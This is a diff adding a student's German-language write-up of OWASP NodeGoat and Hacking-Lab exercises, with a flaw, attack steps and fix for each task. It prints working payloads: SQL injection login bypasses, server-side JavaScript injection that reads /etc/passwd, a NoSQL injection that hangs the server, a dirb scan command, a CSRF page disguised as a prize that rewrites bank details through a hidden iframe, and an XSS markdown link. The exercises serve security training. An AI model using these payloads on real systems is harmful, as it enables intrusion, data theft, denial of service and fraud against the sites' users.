@@ -1,0 +1,121 @@
+' or '1' like '1
+' or 1=1 #
+1323-4545-6767-8989
+
+6111
+1. SQL-Abfrage kann durch Benutzer verändert werden um Passwort zu umgehen
+2. hacker10 als Benutzername, in einem Textdokument den SQL Code aufschreiben und in das Passwortfeld einfügen: ' or '1' like '1
+3. Anführungszeichen nicht erlauben, Regex um Eingabe zu prüfen
+
+8101 OWASP NodeGoat: A1 Injection
+Contributions: Werte können angepasst werden. Da JavaScript keine Typen spezifiziert, wird hier zuerst probiert, Code zu injizieren.
+Google zur Anzeige von Ordnerinhalt in JS: var fs = require('fs'); var files = fs.readdirSync('.'); (files = Array)
+window.alert(require('fs').readdirSync('.').toString());
+-> Oops... ReferenceError: window is not defined
+res.send(require('fs').readdirSync('.').toString());
+-> Dockerfile,app,artifacts,config,mongodb,node_modules,nodejs,package.json,run_all,server.js,test
+
+res.send(require('fs').readFile('/etc/passwd'));
+-> nichts wird angezeigt
+
+res.send(require('fs').readFileSync('/etc/passwd'));
+-> .BIN File speichern Anfrage
+
+Google... statt res.send() res.end() benutzen
+res.end(require('fs').readFileSync('/etc/passwd'));
+-> Dateiinhalt wird ausgegeben
+
+while(1);
+-> Connecting... , keine Antwort der Seite mehr
+
+8101 OWASP NodeGoat: A1 Mongo DB Server Side Java Script Injection
+1) $where von mongoDB führt JavaScript aus
+2) Allocations: mit Stocks Threshold kann Grenzwert für angezeigte Asset Allocations gesetzt werden. Tönt nach SQL-Query
+2 -> keine Änderung
+2% ->  Oops.. ERROR: No allocations found for the user (obwohl es eine mit 35% hätte)
+
+Test, ob JS injiziert werden kann: 2; res.end("test"); -> Oops.. ERROR
+https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+1'; date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return 3; -> Oops.. ERROR
+Error kann auch wegen return 3; entstanden sein
+1'; date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return '3
+-> Website braucht 10 Sekunden um zu laden -> Erfolg
+1'; while(1); return '3 -> Connecting... , DOS erfolgreich
+
+3) Input prüfen bevor abgefragt wird (nur Zahl zwischen 0 und 100, wie in HTML Kommentar eigentlich beschrieben)
+
+8102 OWASP NodeGoat: A2 Broken Authentication and Session Management - Timeout
+1) Cookies werden bei Ende der Session nicht gelöscht
+2) Session Management und Timeout im Titel der Aufgabe einziger Hinweis, keine neue Angriffsfläche in der Webapp gefunden.
+Profile und Sign up untersucht.
+(Profile: Wenn ein neuer Vorname eingegeben wird, das Bank Routing Feld aber leergelassen wird, verschwindet der Name oben rechts...)
+Zum Vergleich des Cookie Managements wird das JSESSIONID Cookie von www.hacking-lab.com benutzt, was dieselbe Funktion erfüllen sollte.
+Im Cookies Manager+ v1.14.3 wird angezeigt, wann das Cookie verfällt (Expires)
+JSESSIONID von Hacking Lab: At end of session
+connect.sid von Docker: Sat 20 Apr 2019 (...) fast ein Jahr
+Nach Ausloggen aus der Webapp ist connect.sid immer noch da (JSESSIONID aber auch)
+Nach Beenden von Firefox ist JSESSIONID gelöscht, connect.sid nicht -> unsauber
+3) Cookies sollten beim Ausloggen gelöscht werden, spätestens beim Schliessen des Browsers
+
+8106 OWASP NodeGoat: A6 Sensitive Data Exposure
+1) Sensible Daten werden unverschlüsselt übertragen und können abgehört werden
+2) Wireshark starten auf allen Interfaces (any)
+Docker starten, mit user1 einloggen
+Wireshark Ausgabe filtern mit http
+erstes Paket Info: POST /login
+HTML Form zeigt zwei Items: userName und password
+-> Credentials gestohlen
+3) HTTPS verwenden (und NUR HTTPS, so dass kein Downgrading stattfinden kann auf HTTP)
+Hash aus dem Passwort bilden (mit Salt), bevor es geschickt wird, nur mit gehashten Passwörtern arbeiten
+
+6118 - OWASP - A8 – Failure to Restrict URL Access
+1) URLs können ohne entsprechende Berechtigung aufgerufen werden
+2) Logfile in der Aufgabe gegeben. Verschiedene Links mit GET Requests drin, darunter auch ... "GET /12001/xpath_case0/admin/showtransactions" ...
+Zuerst soll im Glockenshop eingeloggt werden bevor man admin-access.txt anschaut
+Link in die URL kopieren listet verschiedene Transaktionen auf mit ID, Kartennummer und Betrag
+3) Authentifizierung bei URL benötigt. Es reicht nicht, die URL einfach nicht anzuzeigen, wird von automatischen Tools trotzdem gefunden.
+
+8104 OWASP NodeGoat: A4 Direct Object References
+1) Daten, die in der Webapplikation benutzt und verarbeitet werden, sind offen zu sehen und können geändert werden.
+2) einloggen als user1, view page source
+In side nav gibt es verschiedene Links, nur /allocations/2 hat eine Nummer am Schluss, vielleicht eine User ID?
+/allocations/2 -> Asset Allocations for John Doe
+/allocations/1 -> Asset Allocations for Node Goat Admin
+/allocations/3 -> Asset Allocations for Will Smith
+keine weiteren gefunden
+3) allocations Link darf nicht so funktionieren, andere Links brauchen auch keinen Parameter in der URL.
+Session ID oder andere Authentifizierung verwenden.
+
+8107 OWASP NodeGoat: A7 Missing Function Level Access Control
+1) Funktionen der Web App werden zwar nicht angezeigt im GUI, können aber trotzdem vom User ausgeführt werden.
+2) Dirbuster um "versteckte" Funktionen zu finden. 
+dirb http://261ec4993887.i.hacking-lab.com /usr/share/dirb/wordlists/common.txt -o ./Desktop/owasp.txt
+ein paar neue Seiten gefunden, z.B. /benefits, /images, /vendor...
+im GUI auf /benefits gehen, Startdatum ändern
+3) Authentifizierung des Users für Benutzung der Funktion
+
+8108 OWASP NodeGoat: 
+1) durch Klicken auf einen Button kann per JavaScript auf eine andere Seite eingewirkt werden, z.B. um Werte zu verändern
+2) auf der Memo Seite XSS probieren:
+<script>window.location.href = "../profile"; document.getElementById("bankAcc").value = 4321; document.getElementById("bankRouting").value=22334455#;</script>
+-> kein Erfolg
+eigene Website erstellen mit einer form, die an die IP von RetireEasy die Werte bankAcc und bankRouting schickt, wenn ein Knopf gedrückt wird unter /var/www/html/csrf.html mit apache2
+<html>
+  <form action="http://848bcc118607.i.hacking-lab.com/profile" method="POST" target="celebration">
+  Bravo, Sie haben ein iPhone gewonnen!<br>
+  <input type="hidden" name="bankAcc" value="4321">
+  <input type="hidden" name="bankRouting" value="22334455#">
+  <input type="submit" value="Gewinn einstreichen">
+  </form>
+<iframe name="celebration" height="1" width="1" type="hidden"/>
+</html>
+Problem: profile wird gleich geöffnet und angezeigt, bisschen auffällig...
+Lösung: target Attribut, _blank funktionierte nicht wie gewünscht-> auf kleinst-iframe verweisen -> ok
+beim "Gewinn einstreichen" geht kein neues Fenster mehr auf. man sieht kurz das etwas gemacht wird unten links, sonst aber nichts
+sogar im profile muss man die seite zuerst neu laden um die änderungen zu bemerken
+3) CSRF header setzen? (manchmal beim scannen einer website mit nikto wird angezeigt, dass dieser header nicht gesetzt ist)
+
+8109
+1)
+2) Memos Text: [Marked](javascript&#58this;alert(1&#41;) -> gibt einen Link der alert öffnet
+3)
